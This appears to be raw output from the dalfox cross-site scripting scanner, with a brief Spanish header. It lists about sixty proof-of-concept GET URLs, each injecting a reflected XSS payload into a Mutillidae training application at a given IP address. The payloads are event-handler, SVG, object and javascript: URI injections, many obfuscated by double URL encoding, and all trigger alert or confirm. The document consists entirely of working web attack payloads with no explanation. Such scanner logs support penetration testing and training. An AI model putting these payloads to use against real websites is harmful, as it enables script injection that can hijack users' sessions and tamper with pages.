🔗 URL: http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php
🧩 Parámetro afectado: page
📄 Evidencia:
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dshow-log.php=%26%2334%3B%26gt%3B%26lt%3BIMG+SRC%3Dx+onsuspend%3D%26%2334%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&set-up-database.php=%2527%253E%253C%2573%2563%2572%2569%2570%2574%253E%2561%256C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?jsonp=%26%2334%3B%26gt%3B%26lt%3BIMG+SRC%3Dx+onpagehide%3D%26%2334%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dview-user-privilege-level.php%26iv%3D6bc24fc1ab650b25b4114e93a98f1eba=%26%2334%3B%26gt%3B%26lt%3BIMG+SRC%3Dx+onpageshow%3D%26%2334%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_Ten=%253E%253C%256F%2562%256A%2565%2563%2574%2520%2564%2561%2574%2561%253D%2523%2520%2563%256F%2564%2565%2562%2561%2573%2565%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%253E%253C%252F%256F%2562%256A%2565%2563%2574%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?dir=%253E%253C%2565%256D%2562%2565%2564%2520%2573%2572%2563%253D%2523%2520%2563%256F%2564%2565%2562%2561%2573%2565%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%252F%252F%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E%253C%252F%2565%256D%2562%2565%2564%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?keywords=%26%2334%3B%26gt%3B%26lt%3Bimg+src%3Dx+onerror%3D%26%2334%3Bcrypto.subtle%26amp%3B%26amp%3Balert%281%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dclient-side-control-challenge.php=%2522%253E%253C%2564%2533%2522%253C%2522%252F%256F%256E%2563%256C%2569%2563%256B%253D%2522%253E%255B%2563%256F%256E%2566%2569%2572%256D%2560%2560%255D%2522%253C%2522%253E%257A&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?immagine=%2527%253E%253C%2573%2576%2567%253E%253C%2573%2565%2574%2520%256F%256E%2562%2565%2567%2569%256E%253D%2561%256C%2565%2572%2574%2528%2531%2529%2520%2561%2574%2574%2572%2569%2562%2575%2574%2565%254E%2561%256D%2565%253D%2578%2520%2574%256F%253D%2530%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2017-A4-Broken_Access_Control=%27%22%3E%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dalert%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?hints-page-wrapper.php%3Flevel1HintIncludeFile%3D56=%2527%253E%253C%256D%2561%2574%2568%253E%253C%256D%2569%252F%252F%2578%256C%2569%256E%256B%253A%2568%2572%2565%2566%253D%2564%2561%2574%2561%253A%2578%252C%253C%2573%2563%2572%2569%2570%2574%253E%2561%256C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?cat=%22%3E%3Csvg+onload%3D%22navigator.serviceWorker%26%26alert%281%29%22+class%3Ddalfox%3E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?categoryid=%26%2339%3B%26gt%3B%26lt%3BsVg%2Fonload%3Dalert%281%29+class%3Ddalfox%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?csrf_token=%22%3E%3CIMG+SRC%3Dx+onplaying%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2013-A1-Injection=%22%3E%3CIMG+SRC%3Dx+onstorage%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?.%2Fwebservices%2Fsoap%2Fws-user-account.php=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2570%2561%2567%2565%2573%2568%256F%2577%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&window=%26gt%3B%26lt%3Btextarea+onfocus%3Dalert%281%29+autofocus%26gt%3B%26lt%3B%2Ftextarea%26gt%3B[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Ftwitter.com%2Fwebpwnized=%2527%253E%253C%256F%2562%256A%2565%2563%2574%2520%2564%2561%2574%2561%253D%2523%2520%2563%256F%2564%2565%2562%2561%2573%2565%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%252F%252F%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E%253C%252F%256F%2562%256A%2565%2563%2574%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?hints-page-wrapper.php%3Flevel1HintIncludeFile%3D11=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2562%2565%2566%256F%2572%2565%2570%2572%2569%256E%2574%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&view=%3E%3Cinput+onfocus%3Dalert%281%29+autofocus%3E[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dlogin.php=%3E%3Cselect+onfocus%3Dalert%281%29+autofocus%3E%3Coption%3Etest%3C%2Foption%3E%3C%2Fselect%3E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dframing.php=%253E%253C%256D%2561%2572%2571%2575%2565%2565%2520%256F%256E%2573%2574%2561%2572%2574%253D%2561%256C%2565%2572%2574%2528%2531%2529%253E%253C%252F%256D%2561%2572%2571%2575%2565%2565%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dregister.php=%26%2334%3B%26gt%3B%26lt%3BIMG+SRC%3Dx+onplaying%3D%26%2334%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?emailto=%26%2334%3B%26gt%3B%26lt%3BSvG%2Fonload%3Dalert%281%29+id%3Ddalfox%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?.%2Fwebservices%2Fsoap%2Fws-lookup-dns-record.php=%26gt%3B%26lt%3Bsvg%26gt%3B%26lt%3Banimate+onbegin%3Dalert%281%29+attributeName%3Dx+dur%3D1s%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?http%3A%2F%2Fwww.youtube.com%2Fuser%2Fwebpwnized=%26%2339%3B%26gt%3B%26lt%3Bobject+data%3D%23+codebase%3Djavascript%3Aalert%281%29%26gt%3B%26lt%3B%2Fobject%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2013-A6-Sensitive_Data_Exposure=%2527%2522%253E%253C%2569%256D%2567%252F%2573%2572%2563%252F%256F%256E%2565%2572%2572%256F%2572%253D%252E%2531%257C%2561%256C%2565%2572%2574%2560%2560%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2013-A5-Security_Misconfiguration=%253C%252F%2573%2563%2572%2569%2570%2574%253E%253C%2573%2576%2567%253E%253C%2573%2563%2572%2569%2570%2574%252F%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E%2561%256C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E%252D%2525%2532%2536%2561%2570%256F%2573%253B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dphpmyadmin.php=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2573%2575%2573%2570%2565%256E%2564%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Ddocumentation%2Fvulnerabilities.php=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%256F%256E%256C%2569%256E%2565%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?page=show-log.php&submit=%26%2339%3B%26gt%3B%26lt%3Bsvg%26gt%3B%26lt%3Buse+href%3Ddata%3Aimage%2Fsvg%2Bxml%2C%26lt%3Bsvg+id%3D%26%2339%3Bx%26%2339%3B+xmlns%3D%26%2339%3Bhttp%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%26%2339%3B+onload%3D%26%2339%3Balert%281%29%26%2339%3B%26gt%3B%26lt%3B%2Fsvg%26gt%3B%23x%26gt%3B[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?.%2Fdocumentation%2Fmutillidae-installation-on-xampp-win7.pdf=%2527%253E%253C%2566%256F%2572%256D%253E%253C%2562%2575%2574%2574%256F%256E%2520%2566%256F%2572%256D%2561%2563%2574%2569%256F%256E%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%253E%2574%2565%2573%2574%253C%252F%2562%2575%2574%2574%256F%256E%253E%253C%252F%2566%256F%2572%256D%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2017-A10-Underprotected_APIs=%253E%253C%256F%2562%256A%2565%2563%2574%2520%2564%2561%2574%2561%253D%2523%2520%2563%256F%2564%2565%2562%2561%2573%2565%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2564%256F%2563%2575%256D%2565%256E%2574%252E%2564%256F%256D%2561%2569%256E%2529%252F%252F%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E%253C%252F%256F%2562%256A%2565%2563%2574%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dstyling-frame.php%26page-to-frame%3Dstyling.php%253Fpage-title%253DStyling%2Bwith%2BMutillidae=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2564%2572%2561%2567%256C%2565%2561%2576%2565%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Ddocument-viewer.php%26PathToDocument%3Ddocumentation%2Fhow-to-access-Mutillidae-over-Virtual-Box-network.php=%2522%253E%253C%2553%2576%2567%252F%256F%256E%256C%256F%2561%2564%253D%2561%256C%2565%2572%2574%2528%2531%2529%2520%2563%256C%2561%2573%2573%253D%2564%256C%2561%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?https%3A%2F%2Fwww.owasp.org%2Findex.php%2FTop_10_2013-A3-Cross-Site_Scripting_%2528XSS%2529=%26gt%3B%26lt%3Bbase+href%3Djavascript%3Aalert%281%29%2F%2F+class%3Ddalfox%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dview-someones-blog.php=%22%3E%3Cimg+src%3Dx+onerror%3D%22self.alert%281%29%22+class%3Ddalfox%3E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Duser-info-xpath.php=%253E%253C%2562%2575%2574%2574%256F%256E%2520%256F%256E%2566%256F%2563%2575%2573%253D%2561%256C%2565%2572%2574%2528%2531%2529%2520%2561%2575%2574%256F%2566%256F%2563%2575%2573%253E%2574%2565%2573%2574%253C%252F%2562%2575%2574%2574%256F%256E%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dhtml5-storage.php=%2522%253E%253C%2569%2546%2572%2541%256D%2565%252F%2573%2572%2563%253D%256A%2561%2556%2561%2573%2563%2552%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E%253C%252F%2569%2546%2572%2561%256D%2545%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?callback=%22%3E%3CIMG+SRC%3Dx+oncuechange%3D%22alert%28String.fromCharCode%2888%2C83%2C83%29%29%22+class%3Ddalfox%3E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?file_name=%26%2339%3B%26gt%3B%26lt%3Ba+href%3Djavas%26amp%3B%2399%3Bript%3Aalert%281%29%2Fclass%3Ddalfox%26gt%3Bclick&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fdo%3Dtoggle-enforce-ssl%26page%3Dshow-log.php=%27%3E%3Ckeygen+onfocus%3Dalert%281%29+autofocus%3E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?%3Fpage%3Dtext-file-viewer.php=%3E%3Cobject+data%3Djavascript%3Aalert%281%29%3E%3C%2Fobject%3E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dsecret-administrative-pages.php=%2522%253E%253C%2573%2576%2567%2520%256F%256E%256C%256F%2561%2564%253D%2522%2574%256F%2570%252E%2561%256C%2565%2572%2574%2528%2531%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?file_url=%26%2334%3B%26gt%3B%26lt%3Bd3%26%2334%3B%26lt%3B%26%2334%3B%2Fonclick%3D%26%2334%3B+class%3Ddalfox%26gt%3B%5Bconfirm%60%60%5D%26%2334%3B%26lt%3B%26%2334%3B%26gt%3Bz&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dcaptured-data.php=%26gt%3B%26lt%3Bsvg%2Fonload%3Dalert%281%29%2F%2F%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?goto=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2573%2565%2561%2572%2563%2568%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Drobots-txt.php=%2527%253E%253C%2573%2576%2567%252F%2563%256C%2561%2573%2573%253D%2527%2564%2561%256C%2566%256F%2578%2527%256F%256E%254C%256F%2561%2564%253D%2561%256C%2565%2572%2574%2528%2531%2529%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?file=%253E%253C%2573%2576%2567%252F%256F%256E%256C%256F%2561%2564%253D%2561%256C%2565%2572%2574%2528%2531%2529%252F%252F%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dphpinfo.php=%26gt%3B%26lt%3Bselect+onfocus%3Dalert%281%29+autofocus%26gt%3B%26lt%3Boption%26gt%3Btest%26lt%3B%2Foption%26gt%3B%26lt%3B%2Fselect%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dadd-to-your-blog.php=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%256C%256F%2561%2564%2565%2564%2564%2561%2574%2561%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?hints-page-wrapper.php%3Flevel1HintIncludeFile%3D12=%27%3E%3Cembed+src%3D%23+codebase%3Djavascript%3Aalert%281%29%3E%3C%2Fembed%3E&page=show-log.php[0m
[95m[POC][R][GET][inHTML-none(1)] http://128.198.49.198:8102/mutillidae/index.php?=&page=show-log.php%3Csource+onload%3Dalert.bind%28%29%281%29+class%3Ddalfox%3E[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?html=%26%2334%3B%26gt%3B%26lt%3BIMG+SRC%3Dx+ondurationchange%3D%26%2334%3Balert%28String.fromCharCode%2888%2C83%2C83%29%29%26%2334%3B+class%3Ddalfox%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?%3Fpage%3Dsource-viewer.php=%253E%253C%256F%2562%256A%2565%2563%2574%2520%2564%2561%2574%2561%253D%2523%2520%2563%256F%2564%2565%2562%2561%2573%2565%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%252F%252F%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E%253C%252F%256F%2562%256A%2565%2563%2574%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Ddocumentation%2Fhow-to-access-Mutillidae-over-Virtual-Box-network.php=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2570%2561%2567%2565%2573%2568%256F%2577%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?.%2Fincludes%2Fpop-up-help-context-generator.php%3Fpagename%3Dshow-log.php=%26gt%3B%26lt%3Bmath%26gt%3B%26lt%3Bmi%2F%2Fxlink%3Ahref%3Ddata%3Ax%2C%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B%26gt%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?enddate=%2527%253E%253C%256F%2562%256A%2565%2563%2574%2520%2564%2561%2574%2561%253D%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%253A%2561%256C%2565%2572%2574%2528%2531%2529%253E%253C%252F%256F%2562%256A%2565%2563%2574%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dsite-footer-xss-discussion.php=%3C%2Fscript%3E%3Csvg%3E%3Cscript%2Fclass%3Ddalfox%3Ealert%281%29%3C%2Fscript%3E-%2526apos%3B&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?index.php%3Fpage%3Dssl-misconfiguration.php=%2522%253E%253C%2549%254D%2547%2520%2553%2552%2543%253D%2578%2520%256F%256E%2570%256C%2561%2579%253D%2522%2561%256C%2565%2572%2574%2528%2553%2574%2572%2569%256E%2567%252E%2566%2572%256F%256D%2543%2568%2561%2572%2543%256F%2564%2565%2528%2538%2538%252C%2538%2533%252C%2538%2533%2529%2529%2522%2520%2563%256C%2561%2573%2573%253D%2564%2561%256C%2566%256F%2578%253E&page=show-log.php[0m
[95m[POC][V][GET][inHTML] http://128.198.49.198:8102/mutillidae/index.php?img_url=%26%2339%3B%26gt%3B%26lt%3Bsvg%26gt%3B%26lt%3BanimateTransform+onbegin%3Dalert%281%29+attributeName%3Dtransform%26gt%3B&page=show-log.php[0m
